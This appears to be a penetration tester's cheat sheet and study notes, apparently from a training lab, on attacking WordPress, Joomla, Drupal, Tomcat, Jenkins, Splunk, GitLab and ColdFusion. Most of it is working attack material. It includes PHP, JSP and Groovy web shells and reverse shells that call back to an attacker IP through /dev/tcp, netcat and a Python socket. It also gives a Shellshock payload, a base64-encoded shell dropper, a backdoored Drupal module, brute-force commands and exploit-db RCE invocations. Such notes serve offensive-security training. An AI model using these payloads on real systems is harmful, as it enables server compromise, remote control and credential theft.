# Attacking Common Applications

## Cheat Sheet

| Command | Description |
|---------|-------------|
| `sudo vim /etc/hosts` | Opens /etc/hosts with vim to add hostnames |
| `sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list` | Runs nmap scan on common web ports from scope_list, outputs to web_discovery in all formats, ```scope_list``` will be IP and any vhosts already found |
| `eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>` | Runs eyewitness on nmap XML output, creates directory |
| `cat web_discovery.xml \| ./aquatone -nmap` | Pipes nmap XML to aquatone as nmap input |
| `sudo wpscan --url <http://domainnameoripaddress> --enumerate` | Runs wpscan with enumeration on target URL |
| `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>` | Runs wpscan XMLRPC password attack with rockyou wordlist |
| `curl -s http://<hostnameoripoftargetsite>/path/to/webshell.php?cmd=id` | Executes id command via PHP webshell with curl |
| `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip address of attack box>/<port of choice> 0>&1'"); ?>` | PHP code for Linux reverse shell |
| `droopescan scan joomla --url http://<domainnameoripaddress>` | Runs droopescan against Joomla site |
| `sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <username or path to username list>` | Runs joomla-brute.py with specified wordlist and usernames |
| `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>` | PHP webshell for Drupal, command via GET parameter |
| `curl -s <http://domainname or IP address of site>/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \| grep uid \| cut -f4 -d">"` | Executes id via Drupal webshell with curl |
| `gobuster dir -u <http://domainnameoripaddressofsite> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt` | Directory brute force with gobuster and wordlist |
| `auxiliary/scanner/http/tomcat_mgr_login` | Metasploit module for Tomcat manager brute force |
| `python3 mgr_brute.py -U <http://domainnameoripaddressofTomCatsite> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt` | Runs mgr_brute.py against Tomcat /manager with default creds lists |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address of attack box> LPORT=<port to listen on to catch a shell> -f war > backup.war` | Generates JSP reverse shell WAR payload |
| `nmap -sV -p 8009,8080 <domainname or IP address of tomcat site>` | Nmap version scan for Tomcat and AJP ports |
| `r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 \| while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()` | Groovy Linux reverse shell for Jenkins Script Console |
| `def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");` | Groovy command execution for Windows Jenkins Script Console |
| `String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);` | Groovy Windows reverse shell for Jenkins Script Console |
| [`reverse_shell_splunk`](https://github.com/0xjpuff/reverse_shell_splunk) | Splunk package for reverse shells on Windows/Linux |

## Enumeration Tools

- [Eyewitness](https://github.com/RedSiege/EyeWitness)
```bash
sudo apt install eyewitness
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

- [Aquatone](https://github.com/michenriksen/aquatone)
```bash
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip
echo $PATH
```
- move to a $PATH location(```/usr/local/bin```) or use in current working folder
```bash
cat web_discovery.xml | ./aquatone -nmap
```

## Example note layout

External Penetration Test - <Client Name\>

- Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)
- Client Points of Contact
- Credentials
- Discovery/Enumeration
    - Scans
    - Live hosts
- Application Discovery
    - Scans
    - Interesting/Notable Hosts
- Exploitation
    - <Hostname or IP\>
    - <Hostname or IP\>
- Post-Exploitation
    - <Hostname or IP\>
    - <Hostname or IP\>
- Appendix
    - Exploited systems (hostname/IP and method of exploitation)
    - Compromised users (account name, method of compromise, account type (local or domain))
    - Artifacts created on systems
    - Changes (such as adding a local admin user or modifying group membership)

## Wordpress

### Manual Enumeration

- ```robots.txt``` - can quickly identify if WordPress used
- ```curl -s http://blog.inlanefreight.local | grep WordPress``` - another quick identification method
- ```wp-content/plugins``` - plugins directory
- ```wp-content/themes``` - themes directory
- WordPress user typses on a standard installation
    1. Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
    2. Editor: An editor can publish and manage posts, including the posts of other users.
    3. Author: They can publish and manage their own posts.
    4. Contributor: These users can write and manage their own posts but cannot publish them.
    5. Subscriber: These are standard users who can browse posts and edit their profiles.
- Manually browse and look at page source
- Grep for wp-content directory, themes and plugin:
```bash
curl -s http://blog.inlanefreight.local/ | grep themes
curl -s http://blog.inlanefreight.local/ | grep plugins
```
- Enumerate versions of found plugins
    - Check for ```readme.txt``` in their directories i.e: ```http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt```
    - Check for vulnerabilities of found versions
- Continue enumaration on other pages i.e: ```curl -s http://blog.inlanefreight.local/?p=1 | grep plugins```
- Try some manual enumeration of usernames and/or passwords at the default login page ```http://blog.inlanefreight.local/wp-login.php``` (testing for different error messages; correct user wrong password etc)
- Can use [waybackurls](https://github.com/tomnomnom/waybackurls) to check for old versions of the site
    - Could discover vulnerable plugins that are no longer used but have not been properly removed

### WPScan Enumeration

- [WPVulnDB](https://wpvulndb.com/) to obtain API token
```bash
sudo gem install wpscan
wpscan -h
```
- Default enumeration (plugins, themes, users, media, and backups):
```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB\<SNIP\>
```
- Default threads used is 5, change with ```-t``` flag.

### Attacking Wordpress

#### Login bruteforce

- [```/xmlrpc.php```](https://kinsta.com/blog/xmlrpc-php/)
- The ```-U``` flag will also take a file of usernames or a single username
- Same for the ```-P``` flag and passwords
- We can also bruteforce wp-login if xmlrpc isn't available but it is slower
```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

#### Code execution

- With access to admin panel
- Go to Appearence side panel, then theme editor
- Select inactive theme to avoid corrupting the main theme (click select)
- Edit an uncommon page such as ```404.php```
- Add below code just below initital comments
```bash
system($_GET[0]);
```
- Click update file to save
- Send commands to the relevant theme page like below:
```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

#### Metasploit [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module

```bash
use exploit/unix/webapp/wp_admin_shell_upload 
set username john
set password firebird1
set lhost 10.10.14.15 
set rhost 10.129.42.195  
set VHOST blog.inlanefreight.local
show options 
exploit
```

**Note:** Make note of where the shell was uploaded to for later clean up

#### Vulnerable plugin examples 

**mail-masta**
- Local file inclusion
```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

**wpDiscuz**

- [WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)](https://www.exploit-db.com/exploits/49967)
    - ```-u``` URL flag
    - ```-p``` path to a valid post flag    
```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```
- Once webshell uploaded can enter commands within the script
- If commands fail within the script they can be executed with curl using the the upload location shown in the script output
- Example:
```bash
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

## Joomla

### Discovery

- Grep the page:
```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
```
- Will possibly be indicated in the ```robots.txt```
- Could be seen in the readme.txt:
```bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```
- Joomla sites sometimes have a telltale favicon
- Possibly find the version in use
```bash
curl -s http://app.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```
- May also find the version number in ```media/system/js/``` or ```administrator/manifests/files/joomla.xml``` (approximate)

### Enumeration

#### Droopscan

- Works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
```bash
sudo pip3 install droopescan
droopescan -h
droopescan scan joomla --url http://dev.inlanefreight.local/
```

#### [JoomlaScan](https://github.com/drego85/JoomlaScan)

- Out of date and requires python 2.7
- Not as valuable as droopescan, can help us find accessible directories and files and may help with fingerprinting installed extensions
```bash
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
python2.7 -m pip install urllib3
python2.7 -m pip install certifi
python2.7 -m pip install bs
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

#### Bruteforcing weak admin password

- ```admin``` is the default admin account, password is set at install
- Attempt brute force with [joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce) script 
```bash
wget https://raw.githubusercontent.com/ajnik/joomla-bruteforce/refs/heads/master/joomla-brute.py
sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

### Attacking Joomla

- Search the version online for known vulnerabilities

#### Abusing Built-In Functionality

- Once valid admin credentials obtained, log in to admin dashboard at ```/administrator```
**TIP:** If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin.
- Click on templates under configuration (bottom left)
- Click on a template name under the Templates column header
- Choose a none standard page, ```error.php``` for example.
- Add the web shell after initial comments
```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); # randomness added to prevent drive by attack whilst performing pentest
```
- Click ```Save & Close```
- Confirm code execution
```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```
- Remember to remove webshell after recording the vulnerability

## Drupal

### Discovery

- "Powered by Drupal" header/footer
- Standard Drupal logo
- The presence of a CHANGELOG.txt file or README.txt file, via the page source
- Clues in the robots.txt file such as references to /node
- grep search:
```bash
curl -s http://drupal.inlanefreight.local | grep Drupal
```
- References to [nodes](https://www.drupal.org/docs/core-modules-and-themes/core-modules/node-module/about-nodes): ```http://drupal.inlanefreight.local/node/1```

### Enumeration

- Drupal supports three types of users by default:
    - Administrator: This user has complete control over the Drupal website.
    - Authenticated User: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
    - Anonymous: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

- Output first two lines of CHANGELOG.txt to see the version in use (will return 404 on latest versions):
```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```
- use droopscan:
```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```

### Attacking Drupal

#### Leveraging the PHP Filter Module

- Log in as admin
- Enable the PHP filter module by ticking the check box next to the module and scroll down to Save configuration
- Go to Content --> Add content and create a Basic page
- Create malicious page:
```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
- Set Text format drop-down to PHP code
- Click Save
- Check function of reverse shell
```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

- From version 8 onwards the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module requires installing first:
```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
- May need to adjust above command for most recent version
- Once downloaded go to ```Administration > Reports > Available updates``` (location may differ)
- ```Browse``` to select downloaded file and click ```Install```
- Once installed click ```Content``` to create basic page like before
- Post pentest delete any installed modules and created pages

#### Uploading a Backdoored Module

- Add a shell to an existing module
- Example using the CAPTCHA module
- Download module
```bash
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
- Create a webshell file:
```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```
- Create a .htaccess file to give ourselves access to the folder
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
- Copy created files to the captcha folder
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
- Login to site with admin access
- Click on ```Manage``` and then ```Extend``` on the sidebar
- Click on the ```+ Install new module``` button
- Browse to the backdoored Captcha archive and click ```Install```
- Browse to ```/modules/captcha/shell.php``` to execute commands
```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

#### Drupalgeddon

- Affects versions 7.0 up to 7.31
- Used to upload a malicious form or create a new admin user
- [PoC](https://www.exploit-db.com/exploits/34992)
- Supply the target URL and a username and password for our new admin account
```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

#### Drupalgeddon2

- Affects versions prior to 7.58 and 8.5.1
- Allows system-level commands to be maliciously injected
- [PoC](https://www.exploit-db.com/exploits/44448)
- Replace the echo command in the exploit script with a command to write out our malicious PHP script (and references to hello.txt):
```bash
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```
- Run module and fill in relevant details to upload shell
```bash
python3 drupalgeddon2.py
...
Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/
Check: http://drupal-dev.inlanefreight.local/mrb3n.php
```
- Confirm RCE
```bash
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

#### Drupalgeddon3

- Affects multiple versions of Drupal 7.x and 8.x 
- RCE vulnerability that exploits improper validation in the Form API
- Requires a user to have the ability to delete a node
- Log in and obtain a valid session cookie
- Load metasploit and add required options
```bash
msfconsole
use multi/http/drupal_drupageddon3
set rhosts 10.129.42.195
set VHOST drupal-acc.inlanefreight.local   
set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
set DRUPAL_NODE 1
set LHOST 10.10.14.15
exploit
```

## Tomcat

### Discovery/Footprinting

- grep docs page for version
```bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```
- General folder structure of Tomcat installation:
```
├── bin                             # Stores scripts and binaries needed to start and run a Tomcat server
├── conf                            # Stores various configuration files used by Tomcat
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib                             # Stores the various JAR files needed for the correct functioning of Tomcat
├── logs                            # Log files
├── temp                            # Tempory files
├── webapps                         # Default webroot of Tomcat and hosts all the applications
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work                            # Acts as a cache and is used to store data during runtime
    └── Catalina
        └── localhost
```
- Each folder inside webapps is expected to have the following structure:
```
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml                     # Deployment descriptor, stores information about the routes/classes handling these routes
    └── lib                         # Stores the libraries needed by that particular application
    |    └── jdbc_drivers.jar
    └── classes                     # Classes might contain important business logic as well as sensitive information
        └── AdminServlet.class   
``` 
- Example web.xml file (important to check to leverage LFI):
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app> 
```
- ``` tomcat-users.xml``` has valuable user information

### Enumeration

- Attempt to locate the /manager and /host-manager pages:
```bash
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
```
- Try to log in with weak creds (tomcat:tomcat, admin:admin) or bruteforce

### Attacking Tomcat

#### Tomcat Manager - Login Brute Force

- Try bruteforcing the Tomcat manager page using Metasploit:
```bash
msfconsole
use auxiliary/scanner/http/tomcat_mgr_login
set VHOST web01.inlanefreight.local
set RPORT 8180
set stop_on_success true
set rhosts 10.129.128.204 
show options 
run
```

#### Tomcat Manager - WAR File Upload

- Available at /manager/html by default
- Users assigned the manager-gui role are allowed to access
- Login to manager page (```http://web01.inlanefreight.local:8180/manager/html```) once valid credentials obtained
- Download JSP web shell and zip it as a .war file
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp 
```
- In the GUI click on ```Browse``` to select the .war file and then click on ```Deploy```
- Once uploaded the ```/backup``` application should appear in the applications table
- Confirm webshell execution ```curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id```
- Undeploy backups application once done

- Can also create a reverse shell using msfvenom
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.251 LPORT=4443 -f war > backup.war
```
- Start a Netcat listener and click on /backup to execute the shell.
```bash
nc -lnvp 4443
```
- Metaploit module ```multi/http/tomcat_mgr_upload``` can automate this process

### Attacking Tomcat CGI

- Enumerate with nmap scan to identify Tomcat
```bash
nmap -p- -sC -Pn 10.129.120.127 --open 
```
- Use ffuf to enumerate for scripts in the /cgi folder:
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.120.127:8080/cgi/FUZZ.cmd
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.120.127:8080/cgi/FUZZ.bat
```
- Try navigating to found pages and appending ```?&dir``` or other commands: ```http://10.129.120.127:8080/cgi/welcome.bat?&dir```
- ```?&set``` to retrieve a list of environment vairables
- If PATH variable not set try hardcode path requests (URL encoded): ```http://10.129.120.127:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe```

#### Attacking CGI Applications - Shellshock

- CGI scripts and programs are kept in the ```/CGI-bin``` directory
- Hunt for cgi scripts:
```bash
gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```
- Try curling any results:
```bash
curl -i http://10.129.204.231/cgi-bin/access.cgi
```
- Test for Shellshock vulnerability
```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
```
- Set nc listener ```nc -lvnp 7777``` and use vulnerability to get a reverse shell:
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.251/7777 0>&1' http://10.129.205.27/cgi-bin/access.cgi
```

## [Jenkins](https://www.jenkins.io/)

### Discovery & Enumeration

- 0pen-source automation server written in Java that helps developers build and test their software projects continuously
- Default runs on port 8080 with slaves on 5000
- Default login page reveals we are dealing with Jenkins
- Default credentials admin:admin

### Attacking Jenkins

#### Script Console

- Run arbitrary Groovy scripts within the Jenkins controller runtime
- Found at ```http://jenkins.inlanefreight.local:8000/script```

**Linux Hosts**

- Example groovy script:
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```
- Reverse shell script
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
- Can use metasploit to get reverse shell:
```bash
use exploit/multi/http/jenkins_script_console
set TARGET < target-id >
exploit
```
- Start listener and upgrade to interactive shell:
```bash
nc -lvnp 8443
/bin/bash -i
```

## Splunk

### Discovery

- Runs on port 8000 by default, port 8089 is the Splunk management port for communication with the Splunk REST API
- Detect with nmap service scan:
```bash
sudo nmap -sV 10.129.201.50
```

### Enumeration

- Check for a forgotton about trial version (converts to free version with no authentication after 60 days)
- Older versions have default creds admin:changeme
- Later versions set creds during install, check for common weak passwords (admin, Welcome, Welcome1, Password123, etc)

### Attacking Splunk

#### Abusing Built-In Functionality

**Windows Hosts**

- Clone reverse shell from GitHub
```bash
git clone https://github.com/0xjpuff/reverse_shell_splunk.git
```
- Edit attacker_ip_here and attacker_port_here in ```reverse_shell_splunk/reverse_shell_splunk/bin/run.ps1```
- Create tar ball of the directory
```bash
cd reverse_shell_splunk
tar -cvzf updater.tar.gz reverse_shell_splunk/
```
- Start a listener
```bash
nc -nvlp 9001
```
- In browser click ```Apps > Manage Apps(cog symbol) > Install app from file```
- ```Browse``` to select tar ball then click ```Upload``` this will trigger the reverse shell

**Linux Hosts**

- Edit ```rev.py``` to:
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

## PRTG Network Monitor

### Discovery/Footprinting/Enumeration

- An nmap scan can reveal PRTG, usually on common web ports (80, 443, 8080)
```bash
sudo nmap -sV -p- --open -T4 10.129.176.144
```
- Can show up in Eyewitness scan
- These scans can reveal version number (which can be searched for exploits) or use curl
```bash
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```
- Default creds ```prtgadmin:prtgadmin```
- Try weak passwords for ```prtgadmin```
- Try know exploits for version

## osTicket

### Footprinting/Discovery/Enumeration

- Can show up in Eyewitness report which can contain ```OSTSESSID``` cookie
- Page footers may show "powered by osTicket" or "Support Ticket System"
- Will not show up in nmap scan

## Gitlab

### Discovery & Enumeration

- Browse to ```gitlab.<domain>``` to discover if a gitlab instance is running
- Try registering an account or signing in with other found credentials/try low risk exploit such as [this](https://www.exploit-db.com/exploits/49821) or its [python3 version](https://github.com/dpgg101/GitLabUserEnum)
- Can also use the registration form to enumerate valid users ```/users/sign_up``` will show already taken usernames
- Browse to ```/help``` to discover version number
- Once logged in browse to ```/explore``` to dig through public projects for anything of interest
- Check the other tabs ```groups```, ```snippets```, and ```help```

### Attacking GitLab

#### Username Enumeration/Password Spray

- 10 minute lockout after 10 failed login attempts by default
- Controlled password spray with weak passwords against found usernames

### Authenticated Remote Code Execution

- [Exploit](https://www.exploit-db.com/exploits/49951) for GitLab Community Edition version 13.10.2 and lower
- Requires valid username and password (may work with self-registered credentials)
```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u Testface -p Testface -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

## Attacking Thick Client Applications

### Tools

#### Information Gathering

- [CFF Explorer](https://ntcore.com/explorer-suite/)
- [Detect It Easy](https://github.com/horsicq/Detect-It-Easy)
- [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Strings](https://learn.microsoft.com/en-us/sysinternals/downloads/strings)

#### Client Side attacks (Static and Dynamic analysis)

- [Ghidra](https://github.com/NationalSecurityAgency/ghidra)
- [IDA](https://hex-rays.com/ida-pro)
- [OllyDbg](https://www.ollydbg.de/)
- [Radare2](https://www.radare.org/n/)
- [dnSpy](https://github.com/dnSpy/dnSpy)
- [x64dbg](https://x64dbg.com/)
- [JADX](https://github.com/skylot/jadx)
- [Frida](https://frida.re/)

#### Network Side Attacks

- [Wireshark](https://www.wireshark.org/)
- [tcpdump](https://www.tcpdump.org/)
- [TCPView](https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview)
- [Burp Suite](https://portswigger.net/burp)

#### Server Side Attacks

Similar to web application attacks, focus on OWASP top 10

## ColdFusion

- ColdFusion is a programming language and a web application development platform based on Java
- ColdFusion Markup Language (CFML) is the proprietary programming language used in ColdFusion
- Coldfusion default ports:

| Port Number | Protocol | Description |
|-------------|----------|-------------|
| 80          | HTTP     | Non-secure HTTP communication between web server and browser |
| 443         | HTTPS    | Secure HTTP communication with encryption between web server and browser |
| 1935        | RPC      | Remote Procedure Call for client-server communication across networks |
| 25          | SMTP     | Simple Mail Transfer Protocol for sending email messages |
| 8500        | SSL      | Secure Socket Layer for server communication |
| 5500        | Server Monitor | Remote administration of the ColdFusion server |


### Discovery & Enumeration

- Ways to detect Coldfusion:

| Method          | Description                                                                 |
|-----------------|-----------------------------------------------------------------------------|
| Port Scanning   | ColdFusion uses port 80 (HTTP) and 443 (HTTPS) by default Nmap service scan may identify ColdFusion |
| File Extensions | Pages use cfm or cfc extensions Presence indicates ColdFusion              |
| HTTP Headers    | Look for "Server: ColdFusion" or "X-Powered-By: ColdFusion" in response headers |
| Error Messages  | Errors may reference ColdFusion-specific tags or functions                 |
| Default Files   | Check for files like admincfm or CFIDE/administrator/indexcfm              |

- Conduct an nmap scan to check for open ports:
```bash
nmap -p- -sC -Pn 10.129.156.229 --open
```
- Navigate to found open ports: ```http://10.129.156.229:8500/```
- Navigate around any found directories

### Attacking ColdFusion

- Check for existing exploits relating to the found version number
```bash
searchsploit adobe coldfusion
```

#### Directory Traversal

- CVE-2010-2861 is the Adobe ColdFusion - Directory Traversal exploit:
    - CFIDE/administrator/settings/mappings.cfm
    - logging/settings.cfm
    - datasources/index.cfm
    - j2eepackaging/editarchive.cfm
    - CFIDE/administrator/enter.cfm
- Attempt directory traversal: ```http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd```
- Directory traversal with known exploit:
```bash
searchsploit -p 14641 # copy exploits path to clipboard
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py . # copy to current directory
python2 14641.py # shows required options
python2 14641.py 10.129.82.113 8500 "../../../../../../../../ColdFusion8/lib/password.properties" # execute script
```

#### Unauthenticated RCE

- Copy exploit to current directory
```bash
searchsploit -p 50057 # copy exploits path to clipboard
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```
- Set variables in the exploit code
```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.186' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.82.113" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```
- Execute exploit
```bash
python3 50057.py 
```

## IIS Tilde Enumeration

- Map target:
```bash
nmap -p- -sV -sC --open 10.129.109.78
```
- Try tilde enumeration of short names ([Files to download](https://github.com/irsdl/IIS-ShortName-Scanner/tree/master/release))
```bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.109.78/
```
- Create wordlist of filenames that match the found short name (```TRANSF~1.ASP```)
```bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```
- Enumerate with gobuster
```bash
gobuster dir -u http://10.129.109.78/ -w /tmp/list.txt -x .aspx,.asp
```

